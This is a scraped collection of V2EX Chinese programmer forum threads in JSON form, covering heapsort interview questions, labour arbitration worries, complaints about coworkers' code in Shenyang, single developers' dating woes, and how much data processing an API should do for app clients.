有，大部分能绕过或者会很快解决；\r", "6 、已经很多人 /公司在使用\r", "\r", "总结：值得尝试", " 谢谢这么详细的回复，准备试一试看 。"]},
{"content": ["<div class=\"topic_content\">今天面试说手写一个堆排序\r<br>\r<br>之前写过几次\r<br>\r<br>临时叫写，还是很难一下写出来\r<br>\r<br>所以面试之前，一定要刷算法题啊</div>"], "reply": "36", "tittle": "面试手写堆排还是挺难的", "comment": ["工作了好多年，我都不记得堆排是什么了，每次排序都调的标准库", "反正我不会", "找工作就是刷题加背书", "写的时候不能用手机 google ？", "不刷题确实不容易，虽然嘴上描述或者伪代码出来很容易，但是敲代码细节容易卡住，需要调试才行，面试还要心里压力之类的，很正常。", "网络上嘴炮太多了", "堆排序那么一大堆能写出来的有几个，这面试这么厉害？", "谁家面试让写堆排序了啊？", "蛋疼的面试，反问面试官让他写一个。", "其实堆排还是挺好写的吧，逻辑清晰，相比快排又没什么容易写错的细节。\r", "（说这样的话会不会被喷呀……", "都是大佬", " #10 我没记错的话，堆排只有一个调整堆要写啊\r", "（看那么多人喊难，我只能默默给你点赞", "堆排还是算简单的吧。。。给纸笔推倒一遍就可以写了吧", "大公司面试基本都考这些啊，看了楼上，难道我面的是假的？", " 严重同意！", "伪算法还是直接 code ？ 表示不 debug 真写不来……～", "简单的二分查找算法，很多人也很难一下子手写出正确的程序来。", "额。。。。。基本都是就调整需要注意一下。。。剩下的都是几个大概就可以了。。。", "堆排应该是最好写的了吧。。", "堆排应该是 O(n log n)里面最好写的了...", "。。。。。。我虽然能写出来，但堆排序怎么都不是最简单的吧。。。 @", " merge sort 是 O(nlogn) 时间复杂度里最好写的啊", " 归并不是更好写？", "堆排怕不是太长了吧。而且写堆排意义不大呀，毕竟有优先队列的。", "社招还要现场写代码？", "归并应该才是最好写。\r", "堆排就从后往前扫一次建堆，然后再扫一次换掉堆顶重新建堆就好了嘛。\r", "之前有一次想到手写堆排发现忘记了，后来特意记了一下就一直没忘。", " 不客气", " \r", " \r", "个人感觉吧...其实是我 merge 没写过(多一倍空间所以用到很少) 不过仔细想想应该是 merge 简单或者至少一个级别的。总之比 quicksort 方便多了也形象", " 你的头像是真的骚", "真的很好奇，面试官出这样子的题目的意义在于什么？\r", "考验面试者技术扎实的程度？堆排这鬼东西，实际 coding 过程中千百年都用不到一次吧？！", "写 Pseudo code 足够了 思路说清楚 就 ok", "堆排算是实际里基本不用的了......要考手写，的确难", " \r", " \r", "O(N logN)里最简单应该是快排啊", "感觉归并和快排比较多见，实际用到的也多一点。\r", "堆排突然让写，是挺有难度的。", "刚考过研的肯定记得，工作那么多年后，我现在就记得是用一个 list 模拟树去操作。", " 当然，考查算法以及编程基础", " 是啊，快排和归并都比较好写"]},
{"content": ["<div class=\"topic_content\">IT 行业跳槽太频繁了，但如果员工提出离职而公司各种阻挠，被逼只能走仲裁，有哪些方式能让自己损失最小？仲裁过一次真的会让自己上当地企业黑名单？</div>"], "reply": "22", "tittle": "员工如果被逼走仲裁，当地所有公司都不会招这个人？", "comment": ["不会", "你想多了 吓唬你", "IT 行业跳槽太频繁了，但如果员工提出离职而公司各种阻挠，被逼只能走仲裁，这公司很容易在当地的圈子里面臭起来，如果不幸上了 V2 ，参考之前的人肉 SEO 。", "没人认识你是谁的，除非你能上央视", "hr 哪有那么多资源可以动用，还知道你个小兵 233\r", "\r", "哪怕是技术圈的明星，也很有可能被哪个财大气粗的公司招进去然后整个过程都不知道这人有啥黑历史", "别想太多，没人认识你 23333", "瞎你的，他能有这么牛逼？", "额，有点不明白了。员工离职还会被阻挠？提前一个月书面通知公司，一个月之后直接走？", "大概你是指小城市没几个 IT 公司的那种？不至于吧。。。", "想太多，公司多的一笔，除非你当地就十个公司", "你换个思路想想，就算真有这个所谓的当地企业黑名单，但估计用这所谓的黑名单的那些公司也就那鸟样。靠仲裁走出来，你还想回去？仲裁一次以后都不会遇到，这波不亏啊。", "这只是套路。有些公司不还吓唬你会出封杀令，人家照样拿到 offer", "劳动仲裁委员会不要太忙(劳动纠纷多啊)..\r", "我觉得公司还是挺怕劳动仲裁作为被告输掉的吧 一般公司如果被提起劳动仲裁 HR 会尽量满足对方要求然后让原告方撤诉的..当然原告无理取闹的除外", "我有两个朋友都涉及过仲裁，之后求职都很顺利。", "提前三十天可以预告解除劳动关系。\r", "记得是 解除劳动关系通知书 而非 辞职申请书。\r", "\r", "公司怎么阻挠？\r", "未及时支付劳动报酬可以向当地劳动监察投诉，后申请仲裁还能多要 20%工资。", " 魔都", " 加班费和工伤报销各种拖", " 魔都放心仲裁好了。。。这么做的公司一般都没太大影响力。。。", "你是在技术圈,不是娱乐圈....", "人走了一样得报销，放心。到期没收到可以申请劳动仲裁", " 工伤什么鬼", " 例如在上班路上受伤，公司理应报销但离职时拖着不给报"]},
{"content": ["<div class=\"topic_content\">在沈阳这边工作，因为离家比较近，没事周六还能回家呆呆。\r<br>\r<br>\r<br>但是真的受够了其他一起写代码的人，各种瞎写，各种糊弄，写出来的代码只能用不能看，一门技术吃一辈子，永远不进步。\r<br>\r<br>\r<br>感觉心真的累，每天写东西我都跑的远远的，就怕和他们写有关系的模块。\r<br>\r<br>\r<br>我什么时候能下定决心逃离这个城市啊， v2exer 有在沈阳工作的么？\r<br>\r<br>\r<br>这边程序员的特点\r<br>\r<br>1.甩锅与吹牛 B\r<br>\r<br>遇到什么问题了， BUG 了总能想办法甩到你的头上，什么都会，到做的时候总能给你讲出来理由做不了，或者讲出来理由让我做，其实就是不会做。\r<br>\r<br>2.复制代码能力超强\r<br>\r<br>写什么东西，只要以前写过就能直接拿过来，多加几个IF判断就OK，其他的自己也看不懂就留在那里，然后代码就越来越越臭越长，真的恶心\r<br>\r<br>\r<br>3.一些数据库的设计我就不说了\r<br>\r<br><a target=\"_blank\" href=\"http://imgur.com/a/KpDMb\" rel=\"nofollow\">http://imgur.com/a/KpDMb</a>\r<br>\r<br>我要循环 90 次查 270 次表，才能算出每天的价格，数据库就是这么设计的，我没有一点点的办法（不能联表，因为有很复杂的运算比较操作），而且很多产品没有对应的价格表没有记录，我又得靠判断一个一个处理。\r<br>\r<br>\r<br>4.前端写出的页面\r<br>\r<br><a target=\"_blank\" href=\"http://imgur.com/a/AIRxj\" rel=\"nofollow\">http://imgur.com/a/AIRxj</a> \r<br>\r<br>什么都写到页面上，有一点修改就得动页面，真的费劲， JS 写的各种问题，我还得帮忙改。页面切出来经常和原型 /UI 上的文字有区别，最后修 BUG 的时候一并甩锅到后端身上，只要看到比较相同的页面直接复制一份改个名，不看细微的文字是否有区别。\r<br>\r<br>\r<br>5.展示一下同事写的代码（用 laravel 能写出这样的代码真的是厉害）\r<br>\r<br><a target=\"_blank\" href=\"http://imgur.com/a/RqlWU\" rel=\"nofollow\">http://imgur.com/a/RqlWU</a>\r<br>\r<br>6.更多恶心的东西 鉴于V2EX没有匿名功能我就不发出来了</div>", "<div class=\"topic_content\">更气的，那些复制粘贴，胡写乱写的人比你写的快多了，而我这种真正想好好写，怎么处理这些垃圾的数据库的人，却因为太慢遭到埋怨。\r<br>\r<br><a target=\"_blank\" href=\"http://imgur.com/a/bCiFx\" rel=\"nofollow\">http://imgur.com/a/bCiFx</a></div>", "<div class=\"topic_content\"><a target=\"_blank\" href=\"http://i.imgur.com/BLAbOaB.png\"><img src=\"http://i.imgur.com/BLAbOaB.png\" class=\"embedded_image\"></a></div>", "<div class=\"topic_content\">想了一下还是把代码的图片都删除掉了。。</div>"], "reply": "152", "tittle": "我真的受够了，在沈阳这个二线城市做个程序员就这么难么？", "comment": ["翻页", "我们公司就我自己是前端， O(∩_∩)O 哈哈~", "楼主多打几把 LoL 就释然了，遍地都是坑队友，要顺心只有自己 carry ，何必跟芸芸众生死磕。", "v2 逛多了。感觉是不是写代码的人都觉得自己的技术比别人好？", " #104 我去哪个公司接什么外包都会有一种这个团队里一定有特别牛逼的，能跟我有共同语言的，喜欢技术的，后来发现一个都没有", " #104 我去哪个公司接什么外包都会幻想这个团队里一定有特别牛逼的，能跟我有共同语言的，喜欢技术的，后来发现一个都没有", " 我该准备干几年回沈阳呢", " 我也是 哈哈哈", " #107 \r", "我带出来的一些有潜力小孩 基本两年左右就都送帝都大厂了\r", "一个月多挣两万，租房一个月多花 3000 块钱而已", "各种框架瞎用，明知有 bug 偏用。", "四线城市的不说话。", "同情楼主 但这帖子满是地图炮", "大连人表示我村都不敢声称自己二线……", "沈阳是二线城市？\r", "\r", "在我看来，一线城市只有北京、上海、深圳。\r", "广州绝对不能算一线城市，广州应该叫准一线。\r", "杭州、南京、成都这样的算二线。\r", "济南、合肥、西安之类的三线。\r", "沈阳，应该算四线吧……", " 咱俩的看法一样", "「写出来的代码只能用不能看」—— 深有体会，看到那些屎一样的代码，我就心里难受。", "在济南，你说的情况都存在，除了找个更好的，别无选择，除非你能教育你的上级领导更牛逼", "二线城市，我就进来看看", " 你这是按照 it 技术排的序？", "那些用“不是地图炮”开头的，都是地图炮啊。\r", "\r", "二线城市的互联网，也就成都和杭州强一点吧，其他的就别来刷存在感了。\r", "\r", "基友在成都，还是挺有名气的公司，昨天也在微信上和我吐槽工作氛围烂，无法忍受，打算去上海呢。", " \r", "\r", "你去过沈阳吗？我刚从东北玩了一圈回来。沈阳要是 4 线城市的话，那西安就是 5 线，济南和合肥这俩连国家区域中心城市都没选上的恐怕就是 6 线了。", " 求问大佬还收不收小孩了…", "招人的问题。\r", "相比来说北上杭广深好一些，总体素质高，容易招到三观正、业务过关的开发人员。", "四线城市路过看看不说话", " 之前想接个私活，结果一看对方的代码逻辑全在控制器里，模型层为零，我就果断放弃了。", "想我东北， 49 年以前是亚洲最大工业基地， 76 年以前占 90%的工业产值，但是现在搞成了这样。", " #114 你这一线的说法，加个互联网标签可能更准确点", "楼主不要再抱着不切实际的幻想，绝大多数人都是自以为自己很有追求很有理想，其实差不多。如果你心里不忿，那就把自己经手的那部分做到极致，最好把它分拆出来做成独立组件，然后你经手多少，独立多少。如果条件允许，你就分享在 Github 上。当你想换工作时，这些就是你最强大的竞争力。任何公司的人员都是呈正态分布的。习惯就好。这只是一份职业，不是事业，更不是信仰。", "经济相对落后一点的地区，可能就更容易出现这个现象。至少我老家这边也和 lz 你的情况类似，但是至于推锅就不清楚。\r", "\r", "另外一个也是一些当地文化似乎会有一些关系，例如我家这边的有一些程序员有时聊着聊着就会转换了画风，变成聊吃的或者其他什么。\r", "\r", "总体来说，要是老家经济相对发达一点，其实我都不愿意出来。因为习惯老家了", "上次和一个沈阳的同行聊天，他工作四年工资 3500 ，写 java ，不知道是不是真的。。。", "wuli 改改， upup", "我还长春的呢。 沈阳的知足吧。。。", "  很有可能 只会写 crud 的 在东北也就这价格了。", " 沈阳绝对是排在济南、合肥、西安前面的， GDP 排名。", "Welcome to Wuhan\r", "Wuhan Different every day!", " #130 有可能是真的，只能说明他技术不行，又不会吹牛逼", "沈阳这个城市，怎么说呢\r", "\r", "人略土鳖，东北人懒+糊弄的特性发挥到极致\r", "\r", "经济水平一般\r", "\r", "但是目测繁华程度啊 城市化程度啊 还是遥遥领先与济南啊 合肥之流的 跟西安比都要强一些 但是城市不如南方那么干净\r", "\r", "怎么说呢 直观感觉就是你走在市区里 单纯看周围感觉比济南西安合肥更像一个大城市，实际经济活跃度是要比西安差不少的，有大型死气沉沉的国企甚至一些注册在辽宁的大企业支撑基础而已", "那就来西安这个二线城市吧~", "在北京，我见过更烂的代码😂😂😂", " 你这两句英语让我想起了 windy", "得 @楼主一下了，沈阳当然有人看 V2EX 了……这不就来了嘛。。   😊\r", "\r", "渣渣的代码其实哪个城市都有，渣渣的行为也遍地都是，只是大城市的优秀公司很多，代码很漂亮很规范，都是你看的见的，而一些渣渣的小公司的弱智行为你没知道罢了。\r", "\r", "不过话说 沈阳的互联网环境的确不好，经济也真是不景气呢，哎，好像都提不上互联网环境这个词呢。。。 汗。。。\r", "\r", "不过怎么说呢，什么事情都不能一棒子打死，个人感觉还是有一些机会的，因为互联网其实是一个没有地域限制的环境，以后能怎么样还是看自己吧。。。。。\r", "\r", "最后，共勉……", "233 大家对济南的看法好中肯啊，哈哈哈\r", "3-6 线之间", " 大佬这么牛，求带啊！", "带哥，打扰了", "laravel 这框架还真有人瞎 J8 用，光听着别人的安利,使劲的用。 php 基础一点也没就瞎用，代码异常风骚。变量全程拼音缩写,每个拼音 8 级真心不造意思。\r", "那些人只下载最新版永远不造稳定性问题。 新版的文档（由于那些人不懂英语,还是培训班出来的）还看不懂。\r", "\r", "so 请不要随便安利别人用 laravel", " #145 哈哈  最近觉得 laravel 挺好，然后就无线安利，以为能让他们写出更好的代码，后来发现了， TP ， laravel 都一样，还得看人", "回不去的沈阳……我还是在帝都吸霾吧……", " 你确定？？？", "北上广深也一样……领导驱动开发、面向测试编程、文档宛如考卷……", "楼主你的问题在于，以一个积极奋斗者的心态，去了一个行业的末尾！不关乎城市。是你现在的情况已经超越那个环境，要么离开、要么适应，如果你能力超群带动他们！\r", "对于各位回答者想说，别发表地图炮感想。楼主是在抱怨！难道在北上广就没有这样行业末尾的公司、同事吗？只能安慰说不巧你遇到了。不要弄的二三线城市没法活了一样！\r", "作为一个来自伟大哈尔滨的同学，告诉你 @", " 你说的一点都不黑！大多数东北人是打不了代码！东北人最爱干的就是销售，因为销售看似来钱快！ \r", " 因此预测，再过几年。我们会发现编程挣钱多，全部都来打代码。 到时，别没事盯着同事的电脑看，小心屏幕上出现： nichousha 的代码。\r", "\r", "祝楼主 找到自己喜欢的工作环境。加油！\r", "致亲爱的吃瓜程序员同志，你今天写 bug 了吗？明天要加班吗？", "妹子就是沈阳的，她以后会不会让我去沈阳发展", " 可以看我以前的帖子，了解我们团队，我们在沈阳，欢迎投简历或加我微信"]},
{"content": ["<div class=\"topic_content\">V 友们有没有常年单身的程序猿盆友？\r<br>\r<br>日常就是上班下班。\r<br>\r<br>上班基本只和同事打交道，然而同事的男女比例非常不协调，为数不多的女生也都名花有主。\r<br>\r<br>到了不加班的周末闲暇，也缺乏合适的结识靠谱女生的渠道。\r<br>\r<br>似乎只剩下相亲一条路可走了么？\r<br>\r<br>另外，有没有女生多的厂子，大家可以推荐下。\r<br>\r<br>=。=</div>"], "reply": "147", "tittle": "来聊聊程序猿的单身困境", "comment": [" 说得对，不是程序员的问题，这只是一个职业，我所认识的优秀的程序员，都有美满幸福的家庭。", " 按这么说， V2EX 社区只能找男朋友了吧- -", "扩大自己的交际圈子\r", "\r", "别把自己局限在技术小圈子里。", "薅同办公室的.", "上学那么多妹子有的不也是单身吗?在于个人.", " 也可以去 Udacity 哈哈哈，刚发现他们的情人节活动报名的全部都是汉子……", "如果你真的是冲着把妹去的话，网上搜下 pua ，有很多培训机构培训把妹技巧的。", "不善交际，感觉要孤独终老", "如果只求是母的 而且你长相贫贫的话，找个长相一般以下的姑娘追 问题也不大的 因为一般程序员都比较有钱还没地儿花，当然 要是你三寸不烂之舌，也不排队能找到个美若天仙的女同志，说白了，如今这个不是一究二白的年代里，还是嘴的问题。\r", "但如果你比较有追求，那：\r", " 哈哈哈哈 挺赞同你的观点的\r", "拼命工作，尽可能让自己在足够短的时间里提升到一定水准，比如 5 年时间，让自己的技术足够成熟，就可以让自己手上尽可能少的编码工作，比如你变成技术部门主管之类的，那这样你基本也谈不上是真正的程序猿了，其实说白了就是一个道理，让你好好念书的时候，你总想着女朋友，那学业咋整？技术又不咋地，工资自然也不咋地，那你还有啥闲钱搞这搞那？基础建筑代表上层建设，挺现实的问题", "单身与否和程序员这个职业没有多大关系啊，为什么要给这个职业贴奇怪的标签", "有大把大把的职业比程序员还要缺少机会接触和认识女性，不要标签花程序员这个职业。", " 「孤独终老」挺好的，不恶心他人，也不恶心自己，提前作好各种准备吧，提升独立生存技能，祈求上天来个猝死就是很幸福过完这一生了，少年。", "我认识的程序员，大部分都不是单身，这只是个自嘲的段子，当真了啊？", "时间会冲淡一切 包括爱情和头发", "所以，我从去年开始招人，条件均等给妹纸发 offer ，然后妹纸们反馈，公司汉子都有主了😂", "这简单，只要你敢秀。\r", "女生都喜欢美的事物，跟她们展示一下妳的车、房跟优点。\r", "自己生活的好，就会有人想跟你一起生活。", "有空就泡酒吧吧", "够热闹的， 楼主， 别想的太消极，记得那句话叫什么鬼来着清风自来，最后你需要的上帝都会给你。用正确的三观对待生活工作的方方面面，尤其对人，就算是与人为善这么简单的东西最后也会成为你的亮点。对了， 你还很年轻吧", " #11 nga 老哥？😂", "男女比例不和谐也没什么用，摔。我们研发部门除了我就一个女生（已婚），剩下全都是中年已婚男性了，导致我单身至今，哼。", "这应该不是一个群体问题，只是个人问题吧。。吧。。", "相亲其实很适合楼主\r", "只是一个途径 成不成也靠缘分\r", "不要排斥\r", "毕竟你自己也说认识不到妹纸呀", " 姐姐求介绍🤣", " @", " 小姐姐  快来，给你介绍对象", "我司程序员只有 10%的单身率", "把问题分开看，程序员只是职业，感情问题还看个人", "如果把单身问题归咎于程序员。那就单着吧。。\r", "咱公司， 25 以上的娃都有两个了。。。", "我司单着的都是女生，男生都很畅销。。。", "\r", "追求女孩子时间经济成本和回报不成正比。\r", "挺赞同这个观点的", "你们没想过 找不到女朋友是因为做程序员吗？难道不是不够帅 没钱 不懂的哄她们开心吗？", " 对啊！！我们也是！！女生完全没市场，相亲贴全是女生，摔！！", " 赞同  不过还有一个原因 穷!!!", "28 年了，还有更久的吗", "多参与户外活动、培养更大众的爱好、学习撩妹话术……如果能做到这些那脱单的确不难，但有些人不是不懂而是根本不愿做这些事情，可能他就讨厌各种集体活动和集体娱乐，从来不看选秀节目网红剧，也懒得和人发生工作业务之外的无聊对话。而且，通过“委屈自己参与活动”认识的妹子，很大概率也是和自己波长不合的。这么一想确实只能注孤生了吧。", " 我只想问你们公司还找人吗？", "缺乏社交。其实还是穷", " 想过父母亲人的感受吗？？", "原来我不是一个人", " 父母亲人生你的时候，他们有想过你的感受吗？？", " 为了从众而从众，而去刻意随波逐流，委屈自己也委屈他人，浪费自己和众人的生命时光，何必呢。\r", "\r", "拒绝装模作样搞从众社交，选择自己生活的自由才能有真的快乐。\r", "\r", "勇于尝试新鲜领域，发掘新世界，去寻觅 /建立自己钟爱的小团体也是很好玩的事。", " 难道 v2 真的是中国最大的同性交友社区吗？", "感觉身边的程序员情况还好，年龄到了该结婚的结婚，该谈恋爱的谈恋爱。", " 还招人吗", " C Sharp Python 都有坑", " 聊堆栈？", " 大概是中国最大的同性程序员交友社区……", " 有。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我是做服务端这块的,主要现在是做 API<br>\n最近工作中碰到一些不是很顺利的情况,不知道是不是我自己想法不对,在我概念里,如果不涉及到安全问题,很多数据展现上的逻辑工作都应该可以放在客户端处理.具体我也不好举例子,现在客户端(主要是 APP)的要求就是要做到他们数据是拿来就用,不用经过任何处理那种(遍历整理数据等操作).宁可增加网络请求,也不太愿意客户端自己处理掉,最好我这边都全部帮他们解决了.<br>\n我是这么想的:<br>\n1\\考虑到服务器的负载,所以想把一定计算量放到客户端<br>\n2\\考虑到流量,但客户端同事总说现在到处是 wifi,大家流量也很多,这些都是忽略不计的.道理也没错,但这不还有一方面是服务器的带宽么...<br>\n3\\考虑到版本迭代,因为如果服务端数据处理到很细节,适用性很低,基本没法复用,一个需求本来是几个基础 api 提供的数据客户端整合处理下能解决的,需要我提供一个新接口,我不是非常乐意.当然如果整合的接口多,逻辑复杂我也愿意处理的,这里指的是很简单的那些. 客户端一个版本逻辑处理写死了,下个版本改了就改了,作为服务端每次改动要考虑到兼容性,所以我不太愿意维护这么多小接口.</p>\n<p>有点罗嗦,也不知道有没有表达清楚意思.就是想问下大家在做 api 的时候是设计到什么尺度? 真要做到客户端拿到数据只需要展示这种程度么?</p>\n</div></div>", "<div class=\"topic_content\">看评论想了下\r<br>是不是比较合理的都分的层数比较多:  \r<br>1.基础数据层:提供各种最底层的数据,最基础的获取,不会有任何逻辑  \r<br>2.数据逻辑层:这个也是服务端做,就是之前争论的 api 做还是客户端做的那些操作,全部放到这一层,向上从基础数据层获取数据,向下对客户端提供数据.\r<br>3.最后才是客户端\r<br>\r<br>应该很多都大概这么分的吧..\r<br>如果争论问题比较大,以后我想慢慢改成这样</div>"], "reply": "67", "tittle": "服务端 API 设计到什么程度算合适", "comment": ["客户端能做且数据不重要那就客户端做，流量不用太在意但也不能滥用，接口加版本号", " 我大概也是这么个意思 客户端大佬们觉得 数据处理这种事情就不应该放在客户端做 这个问题每次都能争好久  接口加版本号这个懂的 想问下 你那对于每个版本的接口路由分发 做在了 web 服务器那层(比如 nginx) 还是项目的路由里 我不知道做哪里和是 我这边用 golang 写的", "大家都在推诿，做客户端的肯定想偷懒啦。", " 哈哈，这个问题我遇到过，客户端的同学特别“拗”，能让我（ API ）做的都让我做，恨不得我把所有工作都做了，为了一个东西能争论很久（有这个时间早做完了），目的是让我明白我的思路是错的。恩，就这样，结果是我还在这家公司。", " 的确有这个问题...有时候我在表达我的想法,客户端大佬们觉得我想偷懒,少写点代码...我是觉得应该做的都会去做不会推卸,不应该做(意思是不应该放在服务器处理的)就不是很乐意做,不过最后都会妥协..因为项目组 ios+安卓有 2 个大佬,而服务端就我一个小弟,百口莫辩啊", " ...我现在正在遇到这个问题,大佬们心情好点就少说我两句,帮我分担点,一般都是我这边都处理掉了", "1:无关紧要的计算放在客户端，服务器的计算量能省一点是一点。如果客户量大，省下来的计算量也是很客观的\r", "2 ：流量，先保证 app 正确可用，闲着无聊可以做流量的优化。\r", "3 ：具体情况具体分析，如果都是 get 的请求。如果返回的数据包大，那就让客户端分多次来，数据包小那就你整理一下一个 API 返回。如果是 post ，或者是 put ， delete 涉及到数据操作的，最好在一个 api 里面做完，要不然网络中断什么的，出现脏数据是很讨厌的。\r", "\r", "按照你的说法，客户端的同事只是想省力一点而已。", "我也遇到这个问题，对了，我是那个客户端", " 对于 1,可能我自己太理想话了,想把性能上的问题在开发时候能考虑到的顺手都做了,客户端的意思是现在不用考虑这么多,等流量大了服务器啥的就多了,说不定客户端代码都重写了云云,我不知道怎么说服,三观不是很和.  2 我同意你说的,我思路主要和 1 一样,开发时候想到的想顺手做,这个优化的确可以滞后.  3 明白你的意思,对于事务操作肯定是放一个 api 处理了,这边主要是指的 get,数据整合类的逻辑,有时候需求数据可以从几个基础 API 获取自己整合,客户端不是很乐意  \r", "\r", "  我也就吐槽下,他们想省力我也不是很有办法说服他们多写代码...", " 可以说下你们客户端的想法...我看看我们逻辑差在哪里", "还是看业务吧， app 重新发布需要用户自己更新，不像 web 这么方便，很多业务要变的话放 app 里面很不方便。除此我觉得 app 多请求几次去处理没什么问题", " 主要不是在业务逻辑上,业务逻辑因为很多涉及到安全问题,基本都放服务端了,很多问题是在展现逻辑上,这个数据要帮他们整理好,这个数据帮他们拼接好等等,但是其实是可以从 A 接口和 B 接口里获取自己整合,现在需要给他们新写一个 C 接口,我就不太愿意,一个是增加维护成本,一个就是没复用性", " 我们客户端的想法就是和你题目里面那个客户端的想法一样，想要服务器端处理好各种计算，客户端只负责直接展示。在我们这个项目里服务器端的工程师自己就是这样设计的，不用客户端的工程师去提要求。\r", "我们项目里面，服务器端和客户端的工程师的关系还是挺好的，不会为了这个吵架。", "这种事需要一个统管前后端的上级来做决定，\r", "因为两边都可以做、都有理，争论难休", " 我自己在有些项目里开发客户端，有些项目里开发服务器端。对于一个展示要同时读 A 接口和 B 接口然后组合数据这样的情况，我们一般都是要求服务器端整合成一个 C 接口提供数据，主要原因是减少网络请求。\r", "我们的要求是：\r", "1 、尽量减少网络请求\r", "2 、后期业务的调整尽量通过服务器端实现，客户端不修改。所以我们把尽可能多的计算和逻辑放在服务器端口实现。例如某个预订的总价是商品价格+服务费，这个总价的计算 就放在服务器端而不是客户端，这样以后想去掉服务费可以只改服务器，不用改客户端，免得客户端要重新上架（这个例子可能举得不太对，但我一时找不到更好的例子。）。", "客户端来做无关紧要的处理比较合适。服务端的 API 应该定位成可以服务于多种客户端的（ Android/iOS/Web 等），不是以某个客户端为主。\r", "\r", "But 真的要分析具体问题，最好是有一个独立的 API 方案或者方法，服务端和客户端都按文档来，彼此不关心实现。", "能后台处理就后台处理吧。前台永远给他们做展示好了。\r", "这就想 mvc 里面的 view 层一样，只做数据展示就行。\r", "以后要换客户端的人就会简单得多。\r", "要加入一个新的客户端平台也会很方便。", "1, 流量必然要考虑，必定会碰到没有 wifi 的情况，优化流量也能提高项目整体性能，何乐不为。\r", "2, GraphQL 解决了数据组合、复用的问题。\r", "3, 写客户端也是程序员啊，该干的、能干的不可以推诿，别给程序员丢脸。一些处理放在客户端必然能缓解后端服务器的压力，凭啥不做。", "不涉及业务那你给他们写什么，难道界面改了你后台还要改？这不增加大家工作量嘛", "观点： 后台提供的 api 应该是面向数据的，而不是面向页面的。 面向页面的接口，一旦页面发生变动， api 就要发生对应的调整。 而且这样的接口也不够通用，会导致很多割裂的接口，这不是一个好的现象。\r", "方案： 如果大佬讲理由讲不通，那也只得按他们的来咯。  但是你可以考虑增加一个 API gateway ， 由这个 api gateway 完成面向页面的 api 封装，向后调用面向数据的 api 。 如果前端后 node.js 的话，直接丢给他们做。", "补充一个连接：  [微服务实战（二）：使用 API Gateway]( ", ") 或许有些帮助。", " 如果 api 面向而不是面向页面，那么一个页面由很多部分组成，那就要调用好几个接口，这就大大增加了网络请求的负担。在我们的项目里面， api 都是面向页面的，一个页面尽量只请求一次 /一个 api", "没有业务场景单纯谈该放哪边来计算是没有意义的。", "不考虑用户的流量，我觉得是很作死的行为。\r", "要是用户哪天打开流量统计，发现你的 app 是流量大户，说不定就卸载了。", " 是的 的确有发现这个问题 扁平化管理的缺陷", " 明白你的意思了 这种会影响业务逻辑的改动 的确需要考虑进去 学习了", "  很同意你的说法 应该面向数据而不是页面, 做着做着就做到页面的误区了.回头想了下,主要应该是一般开发没文档,都是看着页面+口头问需求的原因...", " 会有这个可能,主要用户量不上来,很多问题不愿意也可能都想不到,光凭嘴巴说服不了很尴尬", "我觉得 一般情况下 这些逻辑是要放在后台做的。 因为 APP 发版的成本很高，而且客户端过多的接口业务反而会导致项目复杂度的提高,平时有什么 BUG,问题的,兼容的 后台直接改就好了,非常方便。 对于通用性，我觉得底层的服务代码肯定是通用的，不同的端确实是需要不同的接口的，需要加个 api 层完成面向页面的 api 封装.", " 这个问题感觉又很难完全有个标准.按页面有按页面的好处,按数据也是.前者连接数是会少,后者更加灵活和容易维护.扯到最后又要扯到具体需求了,不过这种我觉得可以灵活的定,但是可以有一个侧重面", "看你后台有几层了，如果你是中间层对接客户端应该做，如果是底层需要对接所有端那应该给客户端做。", "感觉 APP 还是面向页面写接口好啊，面向数据很蠢的，虽然通用性好，但是架不住一个页面请求好几次接口，逻辑也写在 APP 里，网络请求负担很大。", " 是的，如果有多个模块，就请求多个 api ，我们目前就是按照这样的方式处理。 这样 api 在很大程度上能得到复用，这更有利于 api 维护管理。  如果全部面向页面来做 api ，我认为越往后走， api 维护以及代码维护的成本就会越来越高。 当然，这样肯定就会面临多次网络 io 的开销，但我认为在目前 4G 流行的场景这不是一个大问题。 而且如果发现这块真的是一个短板，那么可以考虑加入 API gateway 。", " 要立字据啊", " 刚好想到这个问题,应该问题也在我分层不是很清晰.前期规划的问题.对于这个事情上我自己看来问题也很大,准备慢慢解藕", " 唉 工作环境没这么理想化呢,我也想有个文档,写代码的时候只要动手动眼别动口.没办法", "我给你讲个不是笑话的笑话——曾经有款手游，战斗动画都是服务端渲染然后以流媒体的形式传回给客户端的。", " 版本号这个我觉得不是很必要，如果有大版本变动，数据结构就会有不同。如果两个版本使用同一个数据库，那么数据就会错乱的。\r", "\r", "如果确实需要兼容老版本接口的话，还要单独做数据兼容处理。", " 如果是类似 AWS 那种给开发者提供接口的话，就有必要加上版本号。 如果是普通的应用场景，版本号不是很必要。", " #38 如果不传版本号的话就确定不了版本，如果是改变接口地址还不如传版本号方便，设计兼容新老版本的 API 我觉得是很有必要的，没有那个 APP 发布大版本后之前的版本就不能用的例子吧", "对于给 app 的接口，工作上遇到的就是客户端同事觉得最好接口面向页面，不希望一个页面调用几次接口，我感觉是不是可以在服务端还是按照面向数据来做接口，给 app 包装出来一个调用多个面向数据的面向页面的接口。后面更新维护也稍微好弄点", "\r", "\r", "有时候兼容起来很困难，不得不再开一个数据库。\r", "如果是普通 app 的话，我觉得不如直接强制更新了。\r", "对于已经有大量的老用户的话，还是得做兼容。\r", "\r", " 说的是炉石吧。", " 比如我附加的说明?你看下是不是这个意思", " #42 兼容确实是问题，如果是企业内部使用倒还可以强制更新，如果对象是大众还真要仔细考虑考虑，能兼容尽量兼容", " 对的~我觉得这个挺合理的，后续维护的话对于 app 页面调整这种，只要修改那一个有数据逻辑的接口就好，而且减少影响其他引用相同的面向数据接口的地方。\r", "工作中几个项目都是轻量化客户端，基本上都是数据显示不做任何处理~我这样做之后同事关系明显好了~就是一有问题不管怎么样都先说是后端返回的数据问题。哈哈", "作为 PM 我跟技术团队完成项目时也遇到过这种事，你考虑到的是性能的问题，实际上我考虑到的是如果由服务端提供 API ，客户端只做展示功能，业务抗错能力会比较强，数据计算逻辑写死在客户端，如果上线后发现需要调整，这时你只能通过更新客户端版本来修正数据展示，而 appstore 的上线审批需要几天时间，对于我们 PM 来说这几天基本是不可忍受的，特别是互金行业，涉及到金额数据的展示这种是致命的，所以宁愿计算逻辑由服务端完成，毕竟随时可改，这是我从产品角度的一些看法，供你参考。", " 这个链接很好的回答了嘛", "补充里的三层是合理的，不过一般项目都前两层合并到一起了。甚至划分不清楚，数据和业务逻辑部分融合到一起了，难以维护。\r", "\r", "实在有必要，就另搞一层后端，专门服务客户端。", "我们这边倾向于尽可能让服务器端做。\r", "其实我挺同意的，我们做 app 